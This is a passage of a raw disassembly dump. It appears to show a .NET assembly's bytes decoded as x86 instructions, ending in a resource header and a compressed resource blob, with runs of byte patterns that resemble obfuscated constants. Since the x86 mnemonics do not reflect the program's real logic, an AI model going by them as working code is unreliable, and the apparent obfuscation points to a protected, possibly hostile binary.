  40471e:	00 11                	add    %dl,(%ecx)
  404720:	28 68 00             	sub    %ch,0x0(%eax)
  404723:	00 0a                	add    %cl,(%edx)
  404725:	d0 15 00 00 02 28    	rclb   $1,0x28020000
  40472b:	63 00                	arpl   %eax,(%eax)
  40472d:	00 0a                	add    %cl,(%edx)
  40472f:	6f                   	outsl  %ds:(%esi),(%dx)
  404730:	78 00                	js     0x404732
  404732:	00 0a                	add    %cl,(%edx)
  404734:	2e 01 2a             	add    %ebp,%cs:(%edx)
  404737:	28 47 00             	sub    %al,0x0(%edi)
  40473a:	00 06                	add    %al,(%esi)
  40473c:	2d 01 2a 1a 8d       	sub    $0x8d1a2a01,%eax
  404741:	2d 00 00 01 0a       	sub    $0xa010000,%eax
  404746:	06                   	push   %es
  404747:	17                   	pop    %ss
  404748:	20 e8                	and    %ch,%al
  40474a:	37                   	aaa
  40474b:	7e 2d                	jle    0x40477a
  40474d:	66 65 66 65 66 66 65 	data16 gs data16 gs data16 data16 gs data16 gs data16 gs sahf
  404754:	66 65 66 65 9e 
  404759:	06                   	push   %es
  40475a:	16                   	push   %ss
  40475b:	20 1d 6d 2d d5 66    	and    %bl,0x66d52d6d
  404761:	66 65 65 66 66 65 65 	data16 gs gs data16 data16 gs gs data16 data16 gs sahf
  404768:	66 66 65 9e 
  40476c:	06                   	push   %es
  40476d:	18 20                	sbb    %ah,(%eax)
  40476f:	4c                   	dec    %esp
  404770:	d2 f6                	shl    %cl,%dh
  404772:	40                   	inc    %eax
  404773:	66 66 65 66 65 65 66 	data16 data16 gs data16 gs gs data16 data16 gs gs data16 sahf
  40477a:	66 65 65 66 9e 
  40477f:	06                   	push   %es
  404780:	19 20                	sbb    %esp,(%eax)
  404782:	aa                   	stos   %al,%es:(%edi)
  404783:	c1 41 38 66          	roll   $0x66,0x38(%ecx)
  404787:	65 66 66 65 66 65 66 	gs data16 data16 gs data16 gs data16 gs sahf
  40478e:	65 9e 
  404790:	20 48 86             	and    %cl,-0x7a(%eax)
  404793:	c8 61 66 66          	enter  $0x6661,$0x66
  404797:	65 66 65 65 66 66 65 	gs data16 gs gs data16 adc %gs:(%esi),%ax
  40479e:	13 06 
  4047a0:	03 69 0b             	add    0xb(%ecx),%ebp
  4047a3:	03 1f                	add    (%edi),%ebx
  4047a5:	20 63 69             	and    %ah,0x69(%ebx)
  4047a8:	0c 16                	or     $0x16,%al
  4047aa:	0d 16 13 05 2b       	or     $0x2b051316,%eax
  4047af:	36 07                	ss pop %es
  4047b1:	08 1a                	or     %bl,(%edx)
  4047b3:	62 08                	bound  %ecx,(%eax)
  4047b5:	1b 63 61             	sbb    0x61(%ebx),%esp
  4047b8:	08 58 09             	or     %bl,0x9(%eax)
  4047bb:	06                   	push   %es
  4047bc:	09 19                	or     %ebx,(%ecx)
  4047be:	5f                   	pop    %edi
  4047bf:	94                   	xchg   %eax,%esp
  4047c0:	58                   	pop    %eax
  4047c1:	61                   	popa
  4047c2:	58                   	pop    %eax
  4047c3:	0b 09                	or     (%ecx),%ecx
  4047c5:	11 06                	adc    %eax,(%esi)
  4047c7:	58                   	pop    %eax
  4047c8:	0d 08 07 1a 62       	or     $0x621a0708,%eax
  4047cd:	07                   	pop    %es
  4047ce:	1b 63 61             	sbb    0x61(%ebx),%esp
  4047d1:	07                   	pop    %es
  4047d2:	58                   	pop    %eax
  4047d3:	09 06                	or     %eax,(%esi)
  4047d5:	09 1f                	or     %ebx,(%edi)
  4047d7:	0b 63 19             	or     0x19(%ebx),%esp
  4047da:	5f                   	pop    %edi
  4047db:	94                   	xchg   %eax,%esp
  4047dc:	58                   	pop    %eax
  4047dd:	61                   	popa
  4047de:	58                   	pop    %eax
  4047df:	0c 11                	or     $0x11,%al
  4047e1:	05 17 58 13 05       	add    $0x5135817,%eax
  4047e6:	11 05 1f 20 33 c4    	adc    %eax,0xc433201f
  4047ec:	16                   	push   %ss
  4047ed:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4047f0:	0b 06                	or     (%esi),%eax
  4047f2:	11 04 16             	adc    %eax,(%esi,%edx,1)
  4047f5:	9e                   	sahf
  4047f6:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4047f9:	58                   	pop    %eax
  4047fa:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4047fd:	04 1a                	add    $0x1a,%al
  4047ff:	33 f0                	xor    %eax,%esi
  404801:	02 07                	add    (%edi),%al
  404803:	7d 1c                	jge    0x404821
  404805:	00 00                	add    %al,(%eax)
  404807:	04 02                	add    $0x2,%al
  404809:	08 7d 1d             	or     %bh,0x1d(%ebp)
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 2a                	add    $0x2a,%al
  404810:	1e                   	push   %ds
  404811:	02 28                	add    (%eax),%ch
  404813:	14 00                	adc    $0x0,%al
  404815:	00 0a                	add    %cl,(%edx)
  404817:	2a 03                	sub    (%ebx),%al
  404819:	30 04 00             	xor    %al,(%eax,%eax,1)
  40481c:	67 00 00             	add    %al,(%bx,%si)
  40481f:	00 00                	add    %al,(%eax)
  404821:	00 00                	add    %al,(%eax)
  404823:	00 d0                	add    %dl,%al
  404825:	16                   	push   %ss
  404826:	00 00                	add    %al,(%eax)
  404828:	02 28                	add    (%eax),%ch
  40482a:	63 00                	arpl   %eax,(%eax)
  40482c:	00 0a                	add    %cl,(%edx)
  40482e:	28 49 00             	sub    %cl,0x0(%ecx)
  404831:	00 06                	add    %al,(%esi)
  404833:	d0 1c 00             	rcrb   $1,(%eax,%eax,1)
  404836:	00 02                	add    %al,(%edx)
  404838:	28 63 00             	sub    %ah,0x0(%ebx)
  40483b:	00 0a                	add    %cl,(%edx)
  40483d:	28 49 00             	sub    %cl,0x0(%ecx)
  404840:	00 06                	add    %al,(%esi)
  404842:	d0 18                	rcrb   $1,(%eax)
  404844:	00 00                	add    %al,(%eax)
  404846:	02 28                	add    (%eax),%ch
  404848:	63 00                	arpl   %eax,(%eax)
  40484a:	00 0a                	add    %cl,(%edx)
  40484c:	28 49 00             	sub    %cl,0x0(%ecx)
  40484f:	00 06                	add    %al,(%esi)
  404851:	28 50 00             	sub    %dl,0x0(%eax)
  404854:	00 06                	add    %al,(%esi)
  404856:	d0 1a                	rcrb   $1,(%edx)
  404858:	00 00                	add    %al,(%eax)
  40485a:	02 28                	add    (%eax),%ch
  40485c:	63 00                	arpl   %eax,(%eax)
  40485e:	00 0a                	add    %cl,(%edx)
  404860:	28 49 00             	sub    %cl,0x0(%ecx)
  404863:	00 06                	add    %al,(%esi)
  404865:	20 ff                	and    %bh,%bh
  404867:	26 89 fa             	es mov %edi,%edx
  40486a:	66 66 65 65 66 66 65 	data16 data16 gs gs data16 data16 gs gs data16 gs popaw
  404871:	65 66 66 65 61 
  404876:	28 5b 00             	sub    %bl,0x0(%ebx)
  404879:	00 06                	add    %al,(%esi)
  40487b:	28 51 00             	sub    %dl,0x0(%ecx)
  40487e:	00 06                	add    %al,(%esi)
  404880:	28 51 00             	sub    %dl,0x0(%ecx)
  404883:	00 06                	add    %al,(%esi)
  404885:	28 4f 00             	sub    %cl,0x0(%edi)
  404888:	00 06                	add    %al,(%esi)
  40488a:	2a 00                	sub    (%eax),%al
  40488c:	56                   	push   %esi
  40488d:	02 03                	add    (%ebx),%al
  40488f:	20 17                	and    %dl,(%edi)
  404891:	92                   	xchg   %eax,%edx
  404892:	9d                   	popf
  404893:	6b 66 66 65          	imul   $0x65,0x66(%esi),%esp
  404897:	65 66 66 65 65 66 66 	gs data16 data16 gs gs data16 gs pop %cx
  40489e:	65 59 
  4048a0:	61                   	popa
  4048a1:	2a 00                	sub    (%eax),%al
  4048a3:	00 92 02 20 4d c1    	add    %dl,-0x3eb2dffe(%edx)
  4048a9:	30 b5 66 65 66 65    	xor    %dh,0x65666566(%ebp)
  4048af:	66 65 66 66 65 59    	data16 gs data16 gs pop %cx
  4048b5:	03 20                	add    (%eax),%esp
  4048b7:	bb 61 f4 0d 66       	mov    $0x660df461,%ebx
  4048bc:	66 65 65 66 66 65 66 	data16 gs gs data16 data16 gs data16 gs gs pop %ax
  4048c3:	65 66 65 58 
  4048c7:	61                   	popa
  4048c8:	2a 00                	sub    (%eax),%al
  4048ca:	00 00                	add    %al,(%eax)
  4048cc:	66 02 03             	data16 add (%ebx),%al
  4048cf:	20 92 9b 35 62 66    	and    %dl,0x6662359b(%edx)
  4048d5:	66 65 65 66 66 65 65 	data16 gs gs data16 data16 gs gs data16 gs pop %cx
  4048dc:	66 65 66 59 
  4048e0:	02 03                	add    (%ebx),%al
  4048e2:	59                   	pop    %ecx
  4048e3:	61                   	popa
  4048e4:	61                   	popa
  4048e5:	2a 00                	sub    (%eax),%al
  4048e7:	00 1e                	add    %bl,(%esi)
  4048e9:	02 28                	add    (%eax),%ch
  4048eb:	14 00                	adc    $0x0,%al
  4048ed:	00 0a                	add    %cl,(%edx)
  4048ef:	2a 03                	sub    (%ebx),%al
  4048f1:	30 03                	xor    %al,(%ebx)
  4048f3:	00 42 00             	add    %al,0x0(%edx)
  4048f6:	00 00                	add    %al,(%eax)
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	00 00                	add    %al,(%eax)
  4048fc:	d0 19                	rcrb   $1,(%ecx)
  4048fe:	00 00                	add    %al,(%eax)
  404900:	02 28                	add    (%eax),%ch
  404902:	63 00                	arpl   %eax,(%eax)
  404904:	00 0a                	add    %cl,(%edx)
  404906:	28 49 00             	sub    %cl,0x0(%ecx)
  404909:	00 06                	add    %al,(%esi)
  40490b:	d0 18                	rcrb   $1,(%eax)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	02 28                	add    (%eax),%ch
  404911:	63 00                	arpl   %eax,(%eax)
  404913:	00 0a                	add    %cl,(%edx)
  404915:	28 49 00             	sub    %cl,0x0(%ecx)
  404918:	00 06                	add    %al,(%esi)
  40491a:	d0 1c 00             	rcrb   $1,(%eax,%eax,1)
  40491d:	00 02                	add    %al,(%edx)
  40491f:	28 63 00             	sub    %ah,0x0(%ebx)
  404922:	00 0a                	add    %cl,(%edx)
  404924:	28 49 00             	sub    %cl,0x0(%ecx)
  404927:	00 06                	add    %al,(%esi)
  404929:	28 51 00             	sub    %dl,0x0(%ecx)
  40492c:	00 06                	add    %al,(%esi)
  40492e:	28 50 00             	sub    %dl,0x0(%eax)
  404931:	00 06                	add    %al,(%esi)
  404933:	28 4e 00             	sub    %cl,0x0(%esi)
  404936:	00 06                	add    %al,(%esi)
  404938:	28 51 00             	sub    %dl,0x0(%ecx)
  40493b:	00 06                	add    %al,(%esi)
  40493d:	2a 00                	sub    (%eax),%al
  40493f:	00 1e                	add    %bl,(%esi)
  404941:	02 28                	add    (%eax),%ch
  404943:	14 00                	adc    $0x0,%al
  404945:	00 0a                	add    %cl,(%edx)
  404947:	2a 03                	sub    (%ebx),%al
  404949:	30 05 00 52 00 00    	xor    %al,0x5200
  40494f:	00 00                	add    %al,(%eax)
  404951:	00 00                	add    %al,(%eax)
  404953:	00 d0                	add    %dl,%al
  404955:	1a 00                	sbb    (%eax),%al
  404957:	00 02                	add    %al,(%edx)
  404959:	28 63 00             	sub    %ah,0x0(%ebx)
  40495c:	00 0a                	add    %cl,(%edx)
  40495e:	28 49 00             	sub    %cl,0x0(%ecx)
  404961:	00 06                	add    %al,(%esi)
  404963:	d0 1b                	rcrb   $1,(%ebx)
  404965:	00 00                	add    %al,(%eax)
  404967:	02 28                	add    (%eax),%ch
  404969:	63 00                	arpl   %eax,(%eax)
  40496b:	00 0a                	add    %cl,(%edx)
  40496d:	28 49 00             	sub    %cl,0x0(%ecx)
  404970:	00 06                	add    %al,(%esi)
  404972:	d0 19                	rcrb   $1,(%ecx)
  404974:	00 00                	add    %al,(%eax)
  404976:	02 28                	add    (%eax),%ch
  404978:	63 00                	arpl   %eax,(%eax)
  40497a:	00 0a                	add    %cl,(%edx)
  40497c:	28 49 00             	sub    %cl,0x0(%ecx)
  40497f:	00 06                	add    %al,(%esi)
  404981:	d0 16                	rclb   $1,(%esi)
  404983:	00 00                	add    %al,(%eax)
  404985:	02 28                	add    (%eax),%ch
  404987:	63 00                	arpl   %eax,(%eax)
  404989:	00 0a                	add    %cl,(%edx)
  40498b:	28 49 00             	sub    %cl,0x0(%ecx)
  40498e:	00 06                	add    %al,(%esi)
  404990:	28 59 00             	sub    %bl,0x0(%ecx)
  404993:	00 06                	add    %al,(%esi)
  404995:	28 51 00             	sub    %dl,0x0(%ecx)
  404998:	00 06                	add    %al,(%esi)
  40499a:	28 50 00             	sub    %dl,0x0(%eax)
  40499d:	00 06                	add    %al,(%esi)
  40499f:	61                   	popa
  4049a0:	28 4f 00             	sub    %cl,0x0(%edi)
  4049a3:	00 06                	add    %al,(%esi)
  4049a5:	2a 00                	sub    (%eax),%al
  4049a7:	00 1e                	add    %bl,(%esi)
  4049a9:	02 28                	add    (%eax),%ch
  4049ab:	14 00                	adc    $0x0,%al
  4049ad:	00 0a                	add    %cl,(%edx)
  4049af:	2a 03                	sub    (%ebx),%al
  4049b1:	30 03                	xor    %al,(%ebx)
  4049b3:	00 60 00             	add    %ah,0x0(%eax)
  4049b6:	00 00                	add    %al,(%eax)
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	28 55 00             	sub    %dl,0x0(%ebp)
  4049bf:	00 06                	add    %al,(%esi)
  4049c1:	20 93 0b 8b e0 66    	and    %dl,0x66e08b0b(%ebx)
  4049c7:	66 65 65 66 66 65 66 	data16 gs gs data16 data16 gs gs popaw
  4049ce:	65 61 
  4049d0:	d0 1b                	rcrb   $1,(%ebx)
  4049d2:	00 00                	add    %al,(%eax)
  4049d4:	02 28                	add    (%eax),%ch
  4049d6:	63 00                	arpl   %eax,(%eax)
  4049d8:	00 0a                	add    %cl,(%edx)
  4049da:	28 49 00             	sub    %cl,0x0(%ecx)
  4049dd:	00 06                	add    %al,(%esi)
  4049df:	28 4f 00             	sub    %cl,0x0(%edi)
  4049e2:	00 06                	add    %al,(%esi)
  4049e4:	d0 18                	rcrb   $1,(%eax)
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	02 28                	add    (%eax),%ch
  4049ea:	63 00                	arpl   %eax,(%eax)
  4049ec:	00 0a                	add    %cl,(%edx)
  4049ee:	28 49 00             	sub    %cl,0x0(%ecx)
  4049f1:	00 06                	add    %al,(%esi)
  4049f3:	d0 16                	rclb   $1,(%esi)
  4049f5:	00 00                	add    %al,(%eax)
  4049f7:	02 28                	add    (%eax),%ch
  4049f9:	63 00                	arpl   %eax,(%eax)
  4049fb:	00 0a                	add    %cl,(%edx)
  4049fd:	28 49 00             	sub    %cl,0x0(%ecx)
  404a00:	00 06                	add    %al,(%esi)
  404a02:	61                   	popa
  404a03:	20 8f f4 9d d0 66    	and    %cl,0x66d09df4(%edi)
  404a09:	65 66 66 65 66 65 66 	gs data16 data16 gs data16 gs data16 sub %dl,%gs:0x0(%eax)
  404a10:	65 28 50 00 
  404a14:	00 06                	add    %al,(%esi)
  404a16:	28 51 00             	sub    %dl,0x0(%ecx)
  404a19:	00 06                	add    %al,(%esi)
  404a1b:	2a 1e                	sub    (%esi),%bl
  404a1d:	02 28                	add    (%eax),%ch
  404a1f:	14 00                	adc    $0x0,%al
  404a21:	00 0a                	add    %cl,(%edx)
  404a23:	2a 03                	sub    (%ebx),%al
  404a25:	30 06                	xor    %al,(%esi)
  404a27:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  404a2b:	00 00                	add    %al,(%eax)
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	00 d0                	add    %dl,%al
  404a31:	1b 00                	sbb    (%eax),%eax
  404a33:	00 02                	add    %al,(%edx)
  404a35:	28 63 00             	sub    %ah,0x0(%ebx)
  404a38:	00 0a                	add    %cl,(%edx)
  404a3a:	28 49 00             	sub    %cl,0x0(%ecx)
  404a3d:	00 06                	add    %al,(%esi)
  404a3f:	d0 18                	rcrb   $1,(%eax)
  404a41:	00 00                	add    %al,(%eax)
  404a43:	02 28                	add    (%eax),%ch
  404a45:	63 00                	arpl   %eax,(%eax)
  404a47:	00 0a                	add    %cl,(%edx)
  404a49:	28 49 00             	sub    %cl,0x0(%ecx)
  404a4c:	00 06                	add    %al,(%esi)
  404a4e:	d0 19                	rcrb   $1,(%ecx)
  404a50:	00 00                	add    %al,(%eax)
  404a52:	02 28                	add    (%eax),%ch
  404a54:	63 00                	arpl   %eax,(%eax)
  404a56:	00 0a                	add    %cl,(%edx)
  404a58:	28 49 00             	sub    %cl,0x0(%ecx)
  404a5b:	00 06                	add    %al,(%esi)
  404a5d:	d0 1a                	rcrb   $1,(%edx)
  404a5f:	00 00                	add    %al,(%eax)
  404a61:	02 28                	add    (%eax),%ch
  404a63:	63 00                	arpl   %eax,(%eax)
  404a65:	00 0a                	add    %cl,(%edx)
  404a67:	28 49 00             	sub    %cl,0x0(%ecx)
  404a6a:	00 06                	add    %al,(%esi)
  404a6c:	d0 1c 00             	rcrb   $1,(%eax,%eax,1)
  404a6f:	00 02                	add    %al,(%edx)
  404a71:	28 63 00             	sub    %ah,0x0(%ebx)
  404a74:	00 0a                	add    %cl,(%edx)
  404a76:	28 49 00             	sub    %cl,0x0(%ecx)
  404a79:	00 06                	add    %al,(%esi)
  404a7b:	d0 16                	rclb   $1,(%esi)
  404a7d:	00 00                	add    %al,(%eax)
  404a7f:	02 28                	add    (%eax),%ch
  404a81:	63 00                	arpl   %eax,(%eax)
  404a83:	00 0a                	add    %cl,(%edx)
  404a85:	28 49 00             	sub    %cl,0x0(%ecx)
  404a88:	00 06                	add    %al,(%esi)
  404a8a:	28 4f 00             	sub    %cl,0x0(%edi)
  404a8d:	00 06                	add    %al,(%esi)
  404a8f:	28 51 00             	sub    %dl,0x0(%ecx)
  404a92:	00 06                	add    %al,(%esi)
  404a94:	28 50 00             	sub    %dl,0x0(%eax)
  404a97:	00 06                	add    %al,(%esi)
  404a99:	28 4f 00             	sub    %cl,0x0(%edi)
  404a9c:	00 06                	add    %al,(%esi)
  404a9e:	28 51 00             	sub    %dl,0x0(%ecx)
  404aa1:	00 06                	add    %al,(%esi)
  404aa3:	2a 1e                	sub    (%esi),%bl
  404aa5:	02 28                	add    (%eax),%ch
  404aa7:	14 00                	adc    $0x0,%al
  404aa9:	00 0a                	add    %cl,(%edx)
  404aab:	2a e2                	sub    %dl,%ah
  404aad:	28 57 00             	sub    %dl,0x0(%edi)
  404ab0:	00 06                	add    %al,(%esi)
  404ab2:	d0 1c 00             	rcrb   $1,(%eax,%eax,1)
  404ab5:	00 02                	add    %al,(%edx)
  404ab7:	28 63 00             	sub    %ah,0x0(%ebx)
  404aba:	00 0a                	add    %cl,(%edx)
  404abc:	28 49 00             	sub    %cl,0x0(%ecx)
  404abf:	00 06                	add    %al,(%esi)
  404ac1:	28 55 00             	sub    %dl,0x0(%ebp)
  404ac4:	00 06                	add    %al,(%esi)
  404ac6:	28 4f 00             	sub    %cl,0x0(%edi)
  404ac9:	00 06                	add    %al,(%esi)
  404acb:	28 50 00             	sub    %dl,0x0(%eax)
  404ace:	00 06                	add    %al,(%esi)
  404ad0:	d0 16                	rclb   $1,(%esi)
  404ad2:	00 00                	add    %al,(%eax)
  404ad4:	02 28                	add    (%eax),%ch
  404ad6:	63 00                	arpl   %eax,(%eax)
  404ad8:	00 0a                	add    %cl,(%edx)
  404ada:	28 49 00             	sub    %cl,0x0(%ecx)
  404add:	00 06                	add    %al,(%esi)
  404adf:	28 50 00             	sub    %dl,0x0(%eax)
  404ae2:	00 06                	add    %al,(%esi)
  404ae4:	2a 00                	sub    (%eax),%al
  404ae6:	00 00                	add    %al,(%eax)
  404ae8:	d3 03                	roll   %cl,(%ebx)
  404aea:	00 00                	add    %al,(%eax)
  404aec:	ce                   	into
  404aed:	ca ef be             	lret   $0xbeef
  404af0:	01 00                	add    %eax,(%eax)
  404af2:	00 00                	add    %al,(%eax)
  404af4:	91                   	xchg   %eax,%ecx
  404af5:	00 00                	add    %al,(%eax)
  404af7:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  404afb:	73 74                	jae    0x404b71
  404afd:	65 6d                	gs insl (%dx),%es:(%edi)
  404aff:	2e 52                	cs push %edx
  404b01:	65 73 6f             	gs jae 0x404b73
  404b04:	75 72                	jne    0x404b78
  404b06:	63 65 73             	arpl   %esp,0x73(%ebp)
  404b09:	2e 52                	cs push %edx
  404b0b:	65 73 6f             	gs jae 0x404b7d
  404b0e:	75 72                	jne    0x404b82
  404b10:	63 65 52             	arpl   %esp,0x52(%ebp)
  404b13:	65 61                	gs popa
  404b15:	64 65 72 2c          	fs gs jb 0x404b45
  404b19:	20 6d 73             	and    %ch,0x73(%ebp)
  404b1c:	63 6f 72             	arpl   %ebp,0x72(%edi)
  404b1f:	6c                   	insb   (%dx),%es:(%edi)
  404b20:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  404b27:	73 69                	jae    0x404b92
  404b29:	6f                   	outsl  %ds:(%esi),(%dx)
  404b2a:	6e                   	outsb  %ds:(%esi),(%dx)
  404b2b:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  404b30:	30 2e                	xor    %ch,(%esi)
  404b32:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  404b35:	43                   	inc    %ebx
  404b36:	75 6c                	jne    0x404ba4
  404b38:	74 75                	je     0x404baf
  404b3a:	72 65                	jb     0x404ba1
  404b3c:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  404b41:	72 61                	jb     0x404ba4
  404b43:	6c                   	insb   (%dx),%es:(%edi)
  404b44:	2c 20                	sub    $0x20,%al
  404b46:	50                   	push   %eax
  404b47:	75 62                	jne    0x404bab
  404b49:	6c                   	insb   (%dx),%es:(%edi)
  404b4a:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  404b51:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  404b55:	62 37                	bound  %esi,(%edi)
  404b57:	37                   	aaa
  404b58:	61                   	popa
  404b59:	35 63 35 36 31       	xor    $0x31363563,%eax
  404b5e:	39 33                	cmp    %esi,(%ebx)
  404b60:	34 65                	xor    $0x65,%al
  404b62:	30 38                	xor    %bh,(%eax)
  404b64:	39 23                	cmp    %esp,(%ebx)
  404b66:	53                   	push   %ebx
  404b67:	79 73                	jns    0x404bdc
  404b69:	74 65                	je     0x404bd0
  404b6b:	6d                   	insl   (%dx),%es:(%edi)
  404b6c:	2e 52                	cs push %edx
  404b6e:	65 73 6f             	gs jae 0x404be0
  404b71:	75 72                	jne    0x404be5
  404b73:	63 65 73             	arpl   %esp,0x73(%ebp)
  404b76:	2e 52                	cs push %edx
  404b78:	75 6e                	jne    0x404be8
  404b7a:	74 69                	je     0x404be5
  404b7c:	6d                   	insl   (%dx),%es:(%edi)
  404b7d:	65 52                	gs push %edx
  404b7f:	65 73 6f             	gs jae 0x404bf1
  404b82:	75 72                	jne    0x404bf6
  404b84:	63 65 53             	arpl   %esp,0x53(%ebp)
  404b87:	65 74 02             	gs je  0x404b8c
  404b8a:	00 00                	add    %al,(%eax)
  404b8c:	00 01                	add    %al,(%ecx)
  404b8e:	00 00                	add    %al,(%eax)
  404b90:	00 00                	add    %al,(%eax)
  404b92:	00 00                	add    %al,(%eax)
  404b94:	00 50 41             	add    %dl,0x41(%eax)
  404b97:	44                   	inc    %esp
  404b98:	50                   	push   %eax
  404b99:	41                   	inc    %ecx
  404b9a:	44                   	inc    %esp
  404b9b:	50                   	push   %eax
  404b9c:	dc 8c 87 0b 00 00 00 	fmull  0xb(%edi,%eax,4)
  404ba3:	00 c7                	add    %al,%bh
  404ba5:	00 00                	add    %al,(%eax)
  404ba7:	00 06                	add    %al,(%esi)
  404ba9:	72 00                	jb     0x404bab
  404bab:	68 00 63 00 00       	push   $0x6300
  404bb0:	00 00                	add    %al,(%eax)
  404bb2:	00 20                	add    %ah,(%eax)
  404bb4:	07                   	pop    %es
  404bb5:	03 00                	add    (%eax),%eax
  404bb7:	00 1f                	add    %bl,(%edi)
  404bb9:	8b 08                	mov    (%eax),%ecx
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	00 00                	add    %al,(%eax)
  404bbf:	00 04 00             	add    %al,(%eax,%eax,1)
  404bc2:	ed                   	in     (%dx),%eax
  404bc3:	52                   	push   %edx
  404bc4:	cd 6b                	int    $0x6b
  404bc6:	13 41 14             	adc    0x14(%ecx),%eax
  404bc9:	7f 9b                	jg     0x404b66
  404bcb:	14 4d                	adc    $0x4d,%al
  404bcd:	62 52 d3             	bound  %edx,-0x2d(%edx)
  404bd0:	d2 20                	shlb   %cl,(%eax)
  404bd2:	85 82 d3 b2 d4 0a    	test   %eax,0xad4b2d3(%edx)
  404bd8:	92                   	xchg   %eax,%edx
  404bd9:	82 c5 4b             	add    $0x4b,%ch
  404bdc:	0c d2                	or     $0xd2,%al
  404bde:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404bdf:	89 6d 71             	mov    %ebp,0x71(%ebp)
  404be2:	fb                   	sti
  404be3:	95                   	xchg   %eax,%ebp
  404be4:	76 2d                	jbe    0x404c13
  404be6:	54                   	push   %esp
  404be7:	45                   	inc    %ebp
  404be8:	36 9b                	ss fwait
  404bea:	49                   	dec    %ecx
  404beb:	b3 25                	mov    $0x25,%bl
  404bed:	d9 29                	fldcw  (%ecx)
  404bef:	bb b3 24 88 87       	mov    $0x878824b3,%ebx
  404bf4:	42                   	inc    %edx
  404bf5:	eb c1                	jmp    0x404bb8
  404bf7:	7e 48                	jle    0x404c41
  404bf9:	2f                   	das
  404bfa:	fe 07                	incb   (%edi)
  404bfc:	1e                   	push   %ds
  404bfd:	94                   	xchg   %eax,%esp
  404bfe:	9e                   	sahf
  404bff:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404c00:	2a d5                	sub    %ch,%dl
  404c02:	83 c4 0f             	add    $0xf,%esp
  404c05:	d4 83                	aam    $0x83
  404c07:	05 4f 3d 09 f6       	add    $0xf6093d4f,%eax
  404c0c:	e0 a1                	loopne 0x404baf
  404c0e:	50                   	push   %eax
  404c0f:	85 a2 d5 9b ae b3    	test   %esp,-0x4c51642b(%edx)
  404c15:	d9 24 8d 82 1f bd fb 	fldenv -0x442e07e(,%ecx,4)
  404c1c:	e0 cd                	loopne 0x404beb
  404c1e:	ef                   	out    %eax,(%dx)
  404c1f:	cd 7b                	int    $0x7b
  404c21:	6f                   	outsl  %ds:(%esi),(%dx)
  404c22:	7e f3                	jle    0x404c17
  404c24:	66 de 1b             	data16 ficomps (%ebx)
  404c27:	98                   	cwtl
  404c28:	58                   	pop    %eax
  404c29:	06                   	push   %es
  404c2a:	27                   	daa
  404c2b:	00 d4                	add    %dl,%ah
  404c2d:	31 35 4d 80 35 b0    	xor    %esi,0xb035804d
  404c33:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c34:	1b fe                	sbb    %esi,%edi
  404c36:	2e af                	cs scas %es:(%edi),%eax
  404c38:	98                   	cwtl
  404c39:	d6                   	salc
  404c3a:	1f                   	pop    %ds
  404c3b:	7d 54                	jge    0x404c91
  404c3d:	0f f7 dc             	maskmovq %mm4,%mm3
  404c40:	eb ad                	jmp    0x404bef
  404c42:	6b 9c b0 de 3a 96 51 	imul   $0x74,0x51963ade(%eax,%esi,4),%ebx
  404c49:	74 
  404c4a:	34 ad                	xor    $0xad,%al
  404c4c:	91                   	xchg   %eax,%ecx
  404c4d:	49                   	dec    %ecx
  404c4e:	4d                   	dec    %ebp
  404c4f:	ca 21 59             	lret   $0x5921
  404c52:	52                   	push   %edx
  404c53:	55                   	push   %ebp
  404c54:	42                   	inc    %edx
  404c55:	51                   	push   %ecx
  404c56:	12 23                	adc    (%ebx),%ah
  404c58:	cd 50                	int    $0x50
  404c5a:	91                   	xchg   %eax,%ecx
  404c5b:	a2 a2 d8 d0 28       	mov    %al,0x28d0d8a2
  404c60:	ca 91 14             	lret   $0x1491
  404c63:	0e                   	push   %cs
  404c64:	fa                   	cli
  404c65:	7c 1e                	jl     0x404c85
  404c67:	be cc e1 6b 7f       	mov    $0x7f6be1cc,%esi
  404c6c:	f1                   	int1
  404c6d:	ae                   	scas   %es:(%edi),%al
  404c6e:	bf f7 f6 62 45       	mov    $0x4562f6f7,%edi
  404c73:	57                   	push   %edi
  404c74:	53                   	push   %ebx
  404c75:	77 17                	ja     0x404c8e
  404c77:	85 92 7d 67 71 d0    	test   %edx,-0x2f8e9883(%edx)
  404c7d:	da cb                	fcmove %st(3),%st
  404c7f:	f7 17                	notl   (%edi)
  404c81:	fb                   	sti
  404c82:	4a                   	dec    %edx
  404c83:	78 b3                	js     0x404c38
  404c85:	84 09                	test   %cl,(%ecx)
  404c87:	45                   	inc    %ebp
  404c88:	ce                   	into
  404c89:	58                   	pop    %eax
  404c8a:	79 bf                	jns    0x404c4b
  404c8c:	d6                   	salc
  404c8d:	32 1c 07             	xor    (%edi,%eax,1),%bl
  404c90:	10 38                	adc    %bh,(%eax)
  404c92:	0e                   	push   %cs
  404c93:	1a f8                	sbb    %al,%bh
  404c95:	27                   	daa
  404c96:	d1 8a 6f 13 0e 73    	rorl   $1,0x730e136f(%edx)
  404c9c:	87 b8 83 f6 e3 2a    	xchg   %edi,0x2ae3f683(%eax)
  404ca2:	d2 c0                	rol    %cl,%al
  404ca4:	d4 cf                	aam    $0xcf
  404ca6:	14 95                	adc    $0x95,%al
  404ca8:	5f                   	pop    %edi
  404ca9:	69 d9 8e bd 94 6a    	imul   $0x6a94bd8e,%ecx,%ebx
  404caf:	2a b2 fd 50 05 bf    	sub    -0x40faaf03(%edx),%dh
  404cb5:	9d                   	popf
  404cb6:	5b                   	pop    %ebx
